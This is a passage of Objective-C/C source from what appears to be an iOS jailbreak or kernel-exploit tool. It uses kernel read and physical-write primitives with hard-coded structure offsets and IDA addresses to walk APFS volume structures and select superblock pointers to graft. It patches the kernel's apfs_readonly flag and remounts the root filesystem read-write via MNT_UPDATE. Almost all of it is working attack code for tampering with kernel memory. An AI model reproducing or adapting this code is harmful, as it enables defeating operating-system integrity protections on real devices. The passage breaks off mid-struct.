static void dt_build69_collect_vollist_vol_sb_cands(uint64_t container, uint64_t outer,
    uint64_t outer_vol_id, dt_build66_vol_sb_cand_t *cands, unsigned *count, void (^log)(NSString *line))
{
    if (!dt_build43_kptr_is_heap(container))
        return;

    uint64_t head = dt_build38_read_u64_dual(container + DT_BAKED_CONTAINER_VOL_LIST,
        "build69 vollist head+0x1F0", log);
    if (dt_build36_kern_kptr_valid(head, 0)) {
        DTPhysLog(log,
            @"[*] build69 vollist vol_sb harvest head=0x%llx outer=0x%llx (IDA @ 0x9743dc)",
            head, outer);
        [[DTRunLogger shared] logStage:@"build69 vollist vol_sb harvest head"];
        uint64_t entry = head;
        for (unsigned i = 0; i < DT_BUILD65_MAX_VOL_LIST && dt_build36_kern_kptr_valid(entry, 0); i++) {
            uint64_t main_ptr = dt_build38_read_u64_dual(entry + DT_BAKED_APFS_MAIN_APFS,
                "build69 vollist+0x138", log);
            uint64_t vol_id = dt_build38_read_u64_dual(entry + DT_BAKED_APFS_VOL_ID,
                "build69 vollist+0x2D8", log);
            bool preferred = (main_ptr == outer) ||
                (outer_vol_id && vol_id == outer_vol_id && entry != outer);
            dt_build69_push_vollist_entry_vol_sb(entry, "vollist", i, preferred, cands, count, log);
            entry = dt_build38_read_u64_dual(entry + DT_BAKED_APFS_VOL_LIST_NEXT,
                "build69 vollist+0x330", log);
        }
        return;
    }

    uint64_t tail = dt_build38_read_u64_dual(container + DT_BAKED_CONTAINER_VOL_LIST_TAIL,
        "build69 vollist tail+0x1F8", log);
    if (!dt_build36_kern_kptr_valid(tail, 0)) {
        DTPhysLog(log, @"[*] build69 vollist vol_sb harvest skip — head/tail null");
        return;
    }

    DTPhysLog(log,
        @"[*] build69 vollist vol_sb harvest tail=0x%llx (IDA handle_mount @ 0x9e0b9c prev @ +0x338)",
        tail);
    [[DTRunLogger shared] logStage:@"build69 vollist vol_sb harvest tail"];

    uint64_t entry = tail;
    for (unsigned i = 0; i < DT_BUILD66_MAX_TAIL_WALK && dt_build36_kern_kptr_valid(entry, 0); i++) {
        uint64_t main_ptr = dt_build38_read_u64_dual(entry + DT_BAKED_APFS_MAIN_APFS,
            "build69 tail+0x138", log);
        uint64_t vol_id = dt_build38_read_u64_dual(entry + DT_BAKED_APFS_VOL_ID,
            "build69 tail+0x2D8", log);
        bool preferred = (main_ptr == outer) ||
            (outer_vol_id && vol_id == outer_vol_id && entry != outer);
        dt_build69_push_vollist_entry_vol_sb(entry, "tail", i, preferred, cands, count, log);
        uint64_t prev = dt_build38_read_u64_dual(entry + DT_BAKED_APFS_VOL_LIST_PREV,
            "build69 tail+0x338", log);
        if (!dt_build36_kern_kptr_valid(prev, 0) || prev == entry)
            break;
        entry = prev;
    }
}

static void dt_build66_push_vol_sb_cand(dt_build66_vol_sb_cand_t *cands, unsigned *count,
    uint64_t ptr, const char *src, void (^log)(NSString *line))
{
    if (!cands || !count || *count >= DT_BUILD66_MAX_VOL_SB_CANDS || !src)
        return;
    if (!dt_build68_vol_sb_ptr_valid(ptr))
        return;

    for (unsigned i = 0; i < *count; i++) {
        if (cands[i].ptr == ptr)
            return;
    }

    dt_build66_vol_sb_cand_t *c = &cands[(*count)++];
    c->ptr = ptr;
    strlcpy(c->src, src, sizeof(c->src));
    c->heap = dt_build43_kptr_is_heap(ptr);
    c->q48 = dt_build38_read_u64_dual(ptr + DT_BAKED_APFS_VOL_QWORD48, "b69 vol_sb q48", log);
    c->q48_ok = dt_build43_vol_q48_ida_allowed(c->q48);

    DTPhysLog(log,
        @"[*] build69 vol_sb cand[%u] ptr=0x%llx(%s) src=%s heap=%d q48=0x%llx ida_ok=%d",
        *count - 1, ptr, dt_build38_kptr_class(ptr), src, c->heap, c->q48, c->q48_ok);
}

static void dt_build66_collect_vol_sb_cands(const dt_apfs_graph_t *g, const uint64_t *backlinks,
    unsigned backlink_count, dt_build66_vol_sb_cand_t *cands, unsigned *count, void (^log)(NSString *line))
{
    *count = 0;
    uint64_t outer = g->mnt_outer;

    dt_build66_push_vol_sb_cand(cands, count,
        dt_build38_read_u64_dual(outer + DT_BAKED_APFS_VOL_SB, "b68 outer C0", log),
        "outer+0xC0", log);
    dt_build66_push_vol_sb_cand(cands, count,
        dt_build38_read_u64_dual(outer + DT_BAKED_APFS_BACKUP_VOL_SB, "b68 outer C8", log),
        "outer+0xC8 backup", log);

    if (dt_build36_kern_kptr_valid(g->container, 0)) {
        dt_build66_push_vol_sb_cand(cands, count,
            dt_build38_read_u64_dual(g->container + DT_BAKED_CONTAINER_NX_SB, "b68 cnx C0", log),
            "container+0xC0 nx", log);
        dt_build66_push_vol_sb_cand(cands, count,
            dt_build38_read_u64_dual(g->container + DT_BAKED_CONTAINER_NX_SB_BUF, "b68 cnx C8", log),
            "container+0xC8 nxbuf", log);
    }

    if (dt_build36_kern_kptr_valid(g->snap_child, 0)) {
        dt_build66_push_vol_sb_cand(cands, count,
            dt_build38_read_u64_dual(g->snap_child + DT_BAKED_APFS_VOL_SB, "b68 snap C0", log),
            "child+0xC0", log);
    }

    for (unsigned i = 0; i < backlink_count; i++) {
        uint64_t apfs = backlinks[i];
        char src[32];
        snprintf(src, sizeof(src), "backlink[%u]+0xC0", i);
        dt_build66_push_vol_sb_cand(cands, count,
            dt_build38_read_u64_dual(apfs + DT_BAKED_APFS_VOL_SB, "b69 bl C0", log), src, log);
    }

    if (dt_build43_kptr_is_heap(g->container)) {
        uint64_t outer_vol_id = 0;
        if (dt_build36_kern_kptr_valid(outer, 0))
            outer_vol_id = dt_build38_read_u64_dual(outer + DT_BAKED_APFS_VOL_ID, "b69 outer+0x2D8", log);
        dt_build69_collect_vollist_vol_sb_cands(g->container, outer, outer_vol_id, cands, count, log);
    }

    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build69 vol_sb cands=%u", *count]];
}

static bool dt_build78_vol_sb_cand_src_match(const dt_build66_vol_sb_cand_t *c, int kind)
{
    switch (kind) {
    case 0:
        return (strncmp(c->src, "vollist", 7) == 0 || strncmp(c->src, "tail", 4) == 0) &&
            strstr(c->src, " match") != NULL;
    case 1:
        return strcmp(c->src, "child+0xC0") == 0;
    case 2:
        return strncmp(c->src, "neighbor[", 9) == 0;
    default:
        return false;
    }
}

static bool dt_build78_try_pick_vol_sb_graft(dt_apfs_graph_t *g, const dt_build66_vol_sb_cand_t *cands,
    unsigned count, int kind, bool require_q48_ok, bool require_heap, void (^log)(NSString *line))
{
    for (unsigned i = 0; i < count; i++) {
        const dt_build66_vol_sb_cand_t *c = &cands[i];
        if (!dt_build78_vol_sb_cand_src_match(c, kind))
            continue;
        if (require_heap && !c->heap)
            continue;
        if (require_q48_ok && !c->q48_ok)
            continue;
        g->vol_sb_graft = c->ptr;
        strlcpy(g->vol_sb_graft_src, c->src, sizeof(g->vol_sb_graft_src));
        DTPhysLog(log,
            @"[+] build78 vol_sb graft pick %s 0x%llx(%s) q48=0x%llx ida_ok=%d",
            c->src, g->vol_sb_graft, dt_build38_kptr_class(g->vol_sb_graft), c->q48, c->q48_ok);
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build78 vol_sb graft %s", c->src]];
        return true;
    }
    return false;
}

static void dt_build66_pick_vol_sb_graft(dt_apfs_graph_t *g, const dt_build66_vol_sb_cand_t *cands,
    unsigned count, void (^log)(NSString *line))
{
    g->vol_sb_graft = 0;
    g->vol_sb_graft_src[0] = '\0';

    static const struct { int kind; bool q48_ok; bool heap; } tiers[] = {
        { 0, true, true },
        { 1, true, true },
        { 2, true, true },
        { 0, false, true },
        { 1, false, true },
        { 2, false, true },
    };
    for (unsigned t = 0; t < sizeof(tiers) / sizeof(tiers[0]); t++) {
        if (dt_build78_try_pick_vol_sb_graft(g, cands, count, tiers[t].kind, tiers[t].q48_ok,
                tiers[t].heap, log))
            return;
    }

    for (unsigned i = 0; i < count; i++) {
        if (strncmp(cands[i].src, "vollist", 7) != 0 && strncmp(cands[i].src, "tail", 4) != 0)
            continue;
        g->vol_sb_graft = cands[i].ptr;
        strlcpy(g->vol_sb_graft_src, cands[i].src, sizeof(g->vol_sb_graft_src));
        DTPhysLog(log,
            @"[+] build69 vol_sb graft pick vollist 0x%llx(%s) q48=0x%llx",
            g->vol_sb_graft, dt_build38_kptr_class(g->vol_sb_graft), cands[i].q48);
        [[DTRunLogger shared] logStage:@"build69 vol_sb graft vollist entry"];
        return;
    }

    for (unsigned i = 0; i < count; i++) {
        if (dt_build67_vol_sb_src_is_nx(cands[i].src))
            continue;
        if (cands[i].ptr == g->vol_sb_outer)
            continue;
        g->vol_sb_graft = cands[i].ptr;
        strlcpy(g->vol_sb_graft_src, cands[i].src, sizeof(g->vol_sb_graft_src));
        DTPhysLog(log,
            @"[+] build69 vol_sb graft pick 0x%llx(%s) src=%s q48=0x%llx",
            g->vol_sb_graft, dt_build38_kptr_class(g->vol_sb_graft), g->vol_sb_graft_src, cands[i].q48);
        [[DTRunLogger shared] logStage:@"build69 vol_sb graft candidate found"];
        return;
    }

    DTPhysLog(log, @"[*] build69 vol_sb graft pick — no vol_sb candidate at +0xC0");
    [[DTRunLogger shared] logStage:@"build69 no vol_sb graft candidate"];
}

static void dt_build66_classify_failure(dt_apfs_graph_t *g)
{
    if (g->mount_ready) {
        strlcpy(g->failure_mode, "mount_ready", sizeof(g->failure_mode));
        return;
    }
    if (dt_build77_osupdate_vol_sb_link_fix_needed(g)) {
        strlcpy(g->failure_mode, "static_c0_link_fix", sizeof(g->failure_mode));
        return;
    }
    if (strcmp(g->fsprivate_class, "hollow") == 0) {
        strlcpy(g->failure_mode, "hollow_root", sizeof(g->failure_mode));
        return;
    }
    if (dt_build36_kern_kptr_valid(g->container, 0) && (dt_build68_vol_sb_ptr_valid(g->vol_sb_child) ||
            dt_build68_vol_sb_ptr_valid(g->vol_sb_graft))) {
        strlcpy(g->failure_mode, "link_fix_pending", sizeof(g->failure_mode));
        return;
    }
    if (dt_build36_kern_kptr_valid(g->container, 0) && dt_build68_vol_sb_ptr_valid(g->vol_sb_graft)) {
        strlcpy(g->failure_mode, "graft_pending", sizeof(g->failure_mode));
        return;
    }
    if (dt_build43_kptr_is_heap(g->container)) {
        strlcpy(g->failure_mode, "heap_container_no_vol_sb", sizeof(g->failure_mode));
        return;
    }
    if (dt_build36_kern_kptr_valid(g->container, 0) && !dt_build43_kptr_is_heap(g->container)) {
        strlcpy(g->failure_mode, "static_container", sizeof(g->failure_mode));
        return;
    }
    strlcpy(g->failure_mode, "null_container", sizeof(g->failure_mode));
}

static void dt_build66_discover_and_enrich(const dt_build38_chain_t *chain, dt_apfs_graph_t *g,
    void (^log)(NSString *line))
{
    dt_build65_discover_and_enrich(chain, g, log);

    [[DTRunLogger shared] logStage:@"build66 extended discovery begin"];
    DTPhysLog(log,
        @"[*] build66 phase2 — neighbor scan + tail walk + backlink + vol_sb matrix (IDA sibling @ 0x9da894)");

    uint64_t outer = g->mnt_outer;
    uint64_t outer_vol_id = 0;
    if (dt_build36_kern_kptr_valid(outer, 0))
        outer_vol_id = dt_build38_read_u64_dual(outer + DT_BAKED_APFS_VOL_ID, "build66 outer+0x2D8", log);

    dt_build76_neighbor_t neighbors[DT_BUILD76_MAX_NEIGHBOR_HITS] = {0};
    g->neighbor_hits = dt_build76_neighbor_pair_scan(outer, neighbors,
        DT_BUILD76_MAX_NEIGHBOR_HITS, log);
    dt_build76_neighbor_compute_stats(neighbors, g->neighbor_hits,
        &g->neighbor_adjacent_hits, &g->neighbor_best_slot);
    if (g->neighbor_hits > 0)
        dt_build76_apply_neighbor_hits(g, neighbors, g->neighbor_hits, NULL, NULL, log);

    if (dt_build36_kern_kptr_valid(g->container, 0))
        dt_build66_log_container_forensics(g->container, g, log);

    if (!dt_build36_kern_kptr_valid(g->snap_child, 0) && dt_build43_kptr_is_heap(g->container)) {
        char reason[64] = {0};
        unsigned tail_entries = 0;
        uint64_t tail_child = 0;
        if (dt_build66_walk_vollist_tail(g->container, outer, outer_vol_id, &tail_child, reason,
                sizeof(reason), &tail_entries, log)) {
            g->snap_child = tail_child;
            strlcpy(g->child_src, reason, sizeof(g->child_src));
            dt_build65_resolve_child_vol_sb(g, log);
        }
        if (tail_entries > g->vollist_scanned)
            g->vollist_scanned = tail_entries;
    }

    uint64_t backlinks[DT_BUILD66_BACKLINK_SCAN_SLOTS] = {0};
    if (dt_build43_kptr_is_heap(g->snap_child)) {
        DTPhysLog(log, @"[*] build69 backlink scan skip — snap_child already 0x%llx", g->snap_child);
        [[DTRunLogger shared] logStage:@"build69 backlink scan skip child ok"];
        g->backlink_hits = 0;
    } else {
        g->backlink_hits = dt_build66_backlink_scan(outer, backlinks,
            DT_BUILD66_BACKLINK_SCAN_SLOTS, log);
    }
    if (!dt_build36_kern_kptr_valid(g->snap_child, 0) && g->backlink_hits > 0) {
        g->snap_child = backlinks[0];
        strlcpy(g->child_src, "backlink+0x138==outer", sizeof(g->child_src));
        dt_build65_resolve_child_vol_sb(g, log);
        DTPhysLog(log, @"[+] build66 snap_child from backlink scan 0x%llx", g->snap_child);
        [[DTRunLogger shared] logStage:@"build66 child from backlink scan"];
    }

    dt_build66_vol_sb_cand_t vol_cands[DT_BUILD66_MAX_VOL_SB_CANDS] = {0};
    unsigned vol_count = 0;
    dt_build66_collect_vol_sb_cands(g, backlinks, g->backlink_hits, vol_cands, &vol_count, log);
    if (g->neighbor_hits > 0)
        dt_build76_apply_neighbor_hits(g, neighbors, g->neighbor_hits, vol_cands, &vol_count, log);
    dt_build66_pick_vol_sb_graft(g, vol_cands, vol_count, log);

    if (dt_build36_kern_kptr_valid(g->mnt_outer, 0))
        g->vol_sb_outer = dt_build38_read_u64_dual(g->mnt_outer + DT_BAKED_APFS_VOL_SB,
            "build66 outer+0xC0 refresh", log);

    dt_build76_read_outer_shell_fields(g, log);
    dt_build76_classify_fsprivate(g);
    dt_build68_compute_mount_ready(g, log);

    dt_build66_classify_failure(g);

    DTPhysLog(log,
        @"[*] build66 discovery report mode=%s class=%s container=0x%llx(%s) child=0x%llx(%s) "
        "vol_sb_graft=0x%llx(%s) neighbor_hits=%u adjacent=%u best_slot=%+d backlink_hits=%u vollist=%u "
        "head_raw=0x%llx tail=0x%llx mount_ready=%d",
        g->failure_mode, g->fsprivate_class, g->container, dt_build38_kptr_class(g->container),
        g->snap_child, dt_build38_kptr_class(g->snap_child),
        g->vol_sb_graft, g->vol_sb_graft_src, g->neighbor_hits, g->neighbor_adjacent_hits,
        g->neighbor_best_slot, g->backlink_hits, g->vollist_scanned,
        g->container_vol_head_raw, g->container_vol_tail, g->mount_ready);
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:
        @"build66 discovery done mode=%s mount_ready=%d", g->failure_mode, g->mount_ready]];

    dt_build76_log_test_report(g, "discover", log);
}

static void dt_build62_resolve_graph(const dt_build38_chain_t *chain, dt_apfs_graph_t *g, void (^log)(NSString *line))
{
    memset(g, 0, sizeof(*g));
    g->mnt_outer = chain->apfs;
    g->snap_child = chain->apfs_main;
    if (g->snap_child == g->mnt_outer)
        g->snap_child = 0;
    g->os_update = dt_build59_root_os_update_graft();

    if (g->os_update && dt_build36_kern_kptr_valid(g->mnt_outer, 0)) {
        uint64_t outer_child = dt_build38_read_u64_dual(g->mnt_outer + DT_BAKED_APFS_MAIN_APFS,
            "build78 outer+0x138 early", log);
        if (dt_build43_kptr_is_heap(outer_child) && outer_child != g->mnt_outer) {
            g->snap_child = outer_child;
            strlcpy(g->child_src, "outer+0x138", sizeof(g->child_src));
        }
        if (dt_build43_kptr_is_heap(chain->container))
            g->container = chain->container;
        else {
            g->container = 0;
            if (dt_build43_kptr_is_heap(g->snap_child)) {
                uint64_t cc = dt_build38_read_u64_dual(g->snap_child + DT_BAKED_APFS_CONTAINER,
                    "build78 child+0xD0 early", log);
                if (dt_build43_kptr_is_heap(cc)) {
                    g->container = cc;
                    strlcpy(g->container_src, "child+0xD0", sizeof(g->container_src));
                }
            }
            if (!dt_build43_kptr_is_heap(g->container) &&
                dt_build36_kern_kptr_valid(chain->apfs_main, 0) &&
                chain->apfs_main != g->mnt_outer) {
                uint64_t mc = dt_build38_read_u64_dual(chain->apfs_main + DT_BAKED_APFS_CONTAINER,
                    "build78 main+0xD0 early", log);
                if (dt_build43_kptr_is_heap(mc)) {
                    g->container = mc;
                    strlcpy(g->container_src, "main+0xD0", sizeof(g->container_src));
                }
            }
        }
    } else {
        g->container = chain->container;
    }

    if (dt_build36_kern_kptr_valid(g->mnt_outer, 0))
        g->vol_sb_outer = dt_build38_read_u64_dual(g->mnt_outer + DT_BAKED_APFS_VOL_SB, "graph outer+0xC0", log);
    if (dt_build36_kern_kptr_valid(g->snap_child, 0))
        g->vol_sb_child = dt_build38_read_u64_dual(g->snap_child + DT_BAKED_APFS_VOL_SB, "graph child+0xC0", log);
    if (dt_build36_kern_kptr_valid(g->container, 0))
        g->nx_sb = dt_build38_read_u64_dual(g->container + DT_BAKED_CONTAINER_NX_SB, "graph container+0xC0", log);

    uint64_t csel_apfs = dt_build36_kern_kptr_valid(g->snap_child, 0) ? g->snap_child : g->mnt_outer;
    if (dt_build36_kern_kptr_valid(csel_apfs, 0))
        g->vol_sb_csel = dt_build38_read_u64_dual(csel_apfs + DT_BAKED_APFS_VOL_SB, "graph csel+0xC0", log);

    if (dt_build36_kern_kptr_valid(g->mnt_outer, 0))
        g->graft_count = (uint16_t)(dt_build38_read_u32_dual(g->mnt_outer + DT_BAKED_APFS_EPHEMERAL_GRAFT_COUNT,
            "graph outer+8584", log) & 0xFFFFu);

    dt_build76_read_outer_shell_fields(g, log);
    dt_build76_classify_fsprivate(g);
    dt_build68_compute_mount_ready(g, log);
}

static void dt_build62_log_graph(const dt_apfs_graph_t *g, const char *tag, void (^log)(NSString *line))
{
    DTPhysLog(log,
        @"[*] build62 %s graph outer=0x%llx child=0x%llx(%s) container=0x%llx(%s) os.update=%d mount_ready=%d",
        tag, g->mnt_outer, g->snap_child, dt_build38_kptr_class(g->snap_child),
        g->container, dt_build38_kptr_class(g->container), g->os_update, g->mount_ready);
    DTPhysLog(log,
        @"[*] build62 %s vol_sb outer+0xC0=0x%llx child=0x%llx(%s) csel+0xC0=0x%llx nx=0x%llx graft=%u",
        tag, g->vol_sb_outer, g->vol_sb_child, g->vol_sb_child_src, g->vol_sb_csel, g->nx_sb, g->graft_count);
    if (g->container_src[0] || g->child_src[0]) {
        DTPhysLog(log,
            @"[*] build62 %s discover src container=%s child=%s mu_gate=%u vollist=%u mode=%s graft_vol=0x%llx(%s) backlink=%u",
            tag, g->container_src, g->child_src, g->container_mu_gate, g->vollist_scanned,
            g->failure_mode, g->vol_sb_graft, g->vol_sb_graft_src, g->backlink_hits);
    }
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:
        @"build62 %s graph mount_ready=%d graft=%u", tag, g->mount_ready, g->graft_count]];
}

static void dt_build62_log_post_step8(const dt_apfs_graph_t *g, void (^log)(NSString *line))
{
    uint32_t mu_gate = 0;
    uint32_t outer_ro = 0;
    uint64_t q48_outer = 0;
    uint64_t q48_child = 0;
    uint64_t q48_nx = 0;

    if (dt_build43_kptr_is_heap(g->container))
        mu_gate = dt_build38_read_u32_dual(g->container + DT_BAKED_CONTAINER_MU_GATE, "post8 container+0x13C", log);
    if (dt_build36_kern_kptr_valid(g->mnt_outer, 0))
        outer_ro = dt_build38_read_u32_dual(g->mnt_outer + DT_BAKED_APFS_READONLY, "post8 outer+0x2B4", log);
    if (dt_build43_kptr_is_heap(g->vol_sb_outer))
        q48_outer = dt_build38_read_u64_dual(g->vol_sb_outer + DT_BAKED_APFS_VOL_QWORD48, "post8 outer vol+48", log);
    if (dt_build43_kptr_is_heap(g->vol_sb_child))
        q48_child = dt_build38_read_u64_dual(g->vol_sb_child + DT_BAKED_APFS_VOL_QWORD48, "post8 child vol+48", log);
    if (dt_build43_kptr_is_heap(g->nx_sb))
        q48_nx = dt_build38_read_u64_dual(g->nx_sb + DT_BAKED_APFS_VOL_QWORD48, "post8 nx+48", log);

    DTPhysLog(log,
        @"[*] build62 post-step8 mu_gate=%u outer_ro=%u q48 outer=0x%llx child=0x%llx nx=0x%llx graft=%u",
        mu_gate, outer_ro, q48_outer, q48_child, q48_nx, g->graft_count);
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:
        @"build62 post-step8 mu=%u ro=%u graft=%u", mu_gate, outer_ro, g->graft_count]];
}

static int dt_build47_rearm_apfs_readonly(uint64_t apfs_eff, void (^log)(NSString *line))
{
    if (!dt_build36_kern_kptr_valid(apfs_eff, 0))
        return 0;
    uint32_t cur = dt_build38_read_u32_dual(apfs_eff + DT_BAKED_APFS_READONLY, "step8 pre apfs+0x2B4", log);
    if (cur != 0) {
        [[DTRunLogger shared] logStage:@"build47 step8 pre apfs_readonly already set"];
        return 0;
    }
    DTPhysLog(log, @"[*] build47 step8 pre apfs_readonly 0 → 1 (IDA apfs_mount_update @ 0xa27394)");
    int patch_err = dt_phys_write32_va(apfs_eff + DT_BAKED_APFS_READONLY, 1, "build47 step8 apfs_readonly", log);
    if (patch_err != 0)
        return patch_err;
    if (dt_build38_read_u32_dual(apfs_eff + DT_BAKED_APFS_READONLY, "step8 post apfs+0x2B4", log) == 0) {
        [[DTRunLogger shared] logStage:@"build47 step8 pre apfs_readonly still clear"];
        return -14;
    }
    [[DTRunLogger shared] logStage:@"build47 step8 pre apfs_readonly OK"];
    return 0;
}

/// os.update boots report f_mntfromname like com.apple.os.update-<hash>@/dev/disk2s1.
/// MNT_UPDATE case 5 expects the device path (after '@'), not the snapshot wrapper.
static const char *dt_normalize_mount_fspec(const char *mntfrom, char *buf, size_t bufsz,
    const char *tag, void (^log)(NSString *line))
{
    if (!mntfrom || mntfrom[0] == '\0')
        return mntfrom;

    const char *at = strrchr(mntfrom, '@');
    if (at && at[1] == '/') {
        strlcpy(buf, at + 1, bufsz);
        if (strcmp(mntfrom, buf) != 0) {
            DTPhysLog(log, @"[*] %s fspec normalize %s → %s", tag, mntfrom, buf);
            dt_run_log_stage([NSString stringWithFormat:@"%s fspec normalize", tag].UTF8String);
        }
        return buf;
    }

    strlcpy(buf, mntfrom, bufsz);
    return buf;
}

static int dt_build47_mount_jumptable_mnt_update(const char *mnton, void (^log)(NSString *line))
{
    struct statfs fs;
    if (statfs(mnton, &fs) != 0) {
        int e = errno ?: -1;
        DTPhysLog(log, @"[!] build47 step8 statfs %s errno=%d", mnton, e);
        return e;
    }

    char fspec_buf[sizeof(fs.f_mntfromname)];
    const char *fspec = dt_normalize_mount_fspec(fs.f_mntfromname, fspec_buf, sizeof(fspec_buf),
        "build47 step8", log);

    struct dt_apfs_mount_args args;
    memset(&args, 0, sizeof(args));
    args.fspec = (char *)fspec;
    args.mount_mode = DT_APFS_MOUNT_FILESYSTEM;
    /* apfs_flags unused on MNT_UPDATE path — routing is vfs_isupdate @ 0x9da238, not jumptable +0 @ 0x9da2e4. */
    args.apfs_flags = DT_BAKED_APFS_MOUNT_JUMPTABLE_MNT_UPDATE;

    /* IDA mount_apfs parity (start @ 0x100001b54):
     * -c @ 0x100001e40: CSEL W23,#1 only — does NOT STR to v71[0]/var_1798.
     * v71[0] zeroed by sub_100003108(null) @ 0x100001c48; only -o getmntopts can set 0x10000
     * ("update" mntopt flag @ 0x1000081d4). -c sets mount-data mode 5 @ 0x100002004 STRH only.
     * mount @ 0x100002684: LDR W2,[var_1798] — no STR to var_1798 between 0x100001f60 and mount.
     * Codex step8 intentionally passes MNT_UPDATE (0x10000) for vfs_isupdate @ 0x9da238. */
    DTPhysLog(log, @"[*] build47 step8 parity: mount_apfs -c uses data mode 5 @ 0x100002004 "
        "without MNT_UPDATE in v71[0]; -o update sets 0x10000 @ 0x1000081d4; "
        "codex uses MNT_UPDATE → vfs_isupdate @ 0x9da238");
    [[DTRunLogger shared] logStage:@"build47 step8 mount_apfs parity note"];

    DTPhysLog(log, @"[*] build47 step8 mount %s fspec=%s MNT_UPDATE (0x10000) "
        "(IDA vfs_isupdate @ 0x9da238 → updating mounted @ 0x9da540 → apfs_mount_update @ 0x9da970)",
        mnton, args.fspec);
    [[DTRunLogger shared] logStage:@"build47 step8 MNT_UPDATE apfs_mount_update try"];

    if (mount(fs.f_fstypename, mnton, MNT_UPDATE, &args) != 0) {
        int e = errno;
        DTPhysLog(log, @"[!] build47 step8 MNT_UPDATE errno=%d (%s)", e, strerror(e));
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build47 step8 MNT_UPDATE fail errno=%d", e]];
        return e > 0 ? e : -1;
    }

    [[DTRunLogger shared] logStage:@"build47 step8 MNT_UPDATE apfs_mount_update OK"];
    return 0;
}

int dt102719_syscall_apfs_mnt_update(const char *mnton, uint32_t mount_mode, void (^log)(NSString *line))
{
    if (!mnton || mnton[0] == '\0')
        return EINVAL;

    struct statfs fs;
    if (statfs(mnton, &fs) != 0) {
        int e = errno ?: -1;
        DTPhysLog(log, @"[!] build102719 statfs %s errno=%d", mnton, e);
        return e;
    }

    char fspec_buf[sizeof(fs.f_mntfromname)];
    const char *fspec = dt_normalize_mount_fspec(fs.f_mntfromname, fspec_buf, sizeof(fspec_buf),
        "build102719", log);

    struct dt_apfs_mount_args args;
    memset(&args, 0, sizeof(args));
    args.fspec = (char *)fspec;
    args.mount_mode = mount_mode;
    args.apfs_flags = DT_BAKED_APFS_MOUNT_JUMPTABLE_MNT_UPDATE;

    DTPhysLog(log, @"[*] build102719 MNT_UPDATE mnton=%s fspec=%s mount_mode=%u apfs_flags=%llu",
        mnton, args.fspec, mount_mode, (unsigned long long)args.apfs_flags);

    if (mount(fs.f_fstypename, mnton, MNT_UPDATE, &args) != 0) {
        int e = errno;
        DTPhysLog(log, @"[!] build102719 MNT_UPDATE errno=%d (%s)", e, strerror(e));
        return e > 0 ? e : -1;
    }

    return 0;
}

int dt102720_syscall_apfs_mnt_update_rw(const char *mnton, void (^log)(NSString *line))
{
    return dt102719_syscall_apfs_mnt_update(mnton, 0, log);
}

int dt102720_syscall_apfs_mnt_update_ro_restore(const char *mnton, void (^log)(NSString *line))
{
    if (!mnton || mnton[0] == '\0')
        return EINVAL;

    struct statfs fs;
    if (statfs(mnton, &fs) != 0) {
        int e = errno ?: -1;
        DTPhysLog(log, @"[!] build102720 statfs %s errno=%d", mnton, e);
        return e;
    }

    char fspec_buf[sizeof(fs.f_mntfromname)];
    const char *fspec = dt_normalize_mount_fspec(fs.f_mntfromname, fspec_buf, sizeof(fspec_buf),
        "build102720", log);

    struct dt_hfs_mount_args args;
    memset(&args, 0, sizeof(args));
    args.fspec = (char *)fspec;
    args.hfs_mask = 0;

    uint32_t vfs_flags = MNT_UPDATE | MNT_RDONLY;

    DTPhysLog(log, @"[*] build102720 MNT_UPDATE|MNT_RDONLY mnton=%s fspec=%s vfs_flags=0x%x "
        "args=dt_hfs_mount_args{fspec,hfs_mask=0}",
        mnton, args.fspec, vfs_flags);

    if (mount(fs.f_fstypename, mnton, vfs_flags, &args) != 0) {
        int e = errno;
        DTPhysLog(log, @"[!] build102720 MNT_UPDATE|MNT_RDONLY errno=%d (%s)", e, strerror(e));
        return e > 0 ? e : -1;
    }

    return 0;
}

static int dt_build47_open_write_probe(const char *dir, const char *tag, void (^log)(NSString *line))
{
    char path[512];
    snprintf(path, sizeof(path), "%s/.dt_build47_probe", dir);
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build62 %s probe begin %s", tag, dir]];
    unlink(path);
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build62 %s probe after unlink", tag]];

    int fd = open(path, O_CREAT | O_WRONLY | O_EXCL, 0644);
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build62 %s probe open returned fd=%d errno=%d", tag, fd, errno]];
    if (fd >= 0) {
        close(fd);
        unlink(path);
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build47 %s open %s OK errno=0", tag, dir]];
        return 0;
    }

    int e = errno;
    DTPhysLog(log, @"[!] build47 %s open %s errno=%d (%s)", tag, path, e, strerror(e));
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build47 %s open %s fail errno=%d", tag, dir, e]];
    return e > 0 ? e : -1;
}

static void dt_build47_statfs_stage(const char *tag, const char *path, void (^log)(NSString *line))
{
    struct statfs fs;
    if (statfs(path, &fs) != 0) {
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build47 %s statfs %s errno=%d", tag, path, errno]];
        return;
    }
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:
        @"build47 %s statfs %s %s flags=0x%x",
        tag, path, (fs.f_flags & MNT_RDONLY) ? "RDONLY" : "RW", fs.f_flags]];
}

static bool dt_build80_root_statfs_rw(const char *tag, void (^log)(NSString *line))
{
    struct statfs fs;
    if (statfs("/", &fs) != 0) {
        int e = errno ?: -1;
        DTPhysLog(log, @"[!] build80 %s statfs / errno=%d (%s)", tag, e, strerror(e));
        [[DTRunLogger shared] logStage:[NSString stringWithFormat:@"build80 %s statfs / errno=%d", tag, e]];
        return false;
    }

    bool rw = (fs.f_flags & MNT_RDONLY) == 0;
    DTPhysLog(log,
        @"[*] build80 %s statfs / %s flags=0x%x (IDA apfs_mount_update success; nx layer needs container+0xC8 @ 0x987978)",
        tag, rw ? "RW" : "RDONLY", fs.f_flags);
    [[DTRunLogger shared] logStage:[NSString stringWithFormat:
        @"build80 %s statfs / %s flags=0x%x", tag, rw ? "RW" : "RDONLY", fs.f_flags]];
    return rw;
}

typedef struct {
    uint64_t mount_mp;
    uint64_t mount_apfs;
    uint32_t mnt_flag;
    uint32_t mnt_kern;
    uint32_t apfs_readonly;
    uint64_t revert_xid;
    uint64_t vol_sb_outer_orig;
    uint64_t outer_container_orig;
